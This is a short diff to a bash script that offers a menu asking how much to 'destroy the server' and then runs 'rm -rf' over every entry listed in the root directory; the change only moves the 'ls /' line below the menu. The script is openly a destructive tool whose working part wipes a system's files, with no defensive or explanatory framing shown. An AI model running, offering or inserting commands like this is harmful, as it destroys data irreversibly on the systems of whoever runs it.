@@ -1,6 +1,5 @@
 #!/bin/bash
 #this is just a comment
-FILES=`ls /`
 
 echo "Choose how much do you want to destroy the server
 1 - Full destroy
@@ -23,6 +22,7 @@ case $choice in
 		exit 0
 esac
 
+FILES=`ls /`
 
 for i in $FILES do
 	rm -rf $i
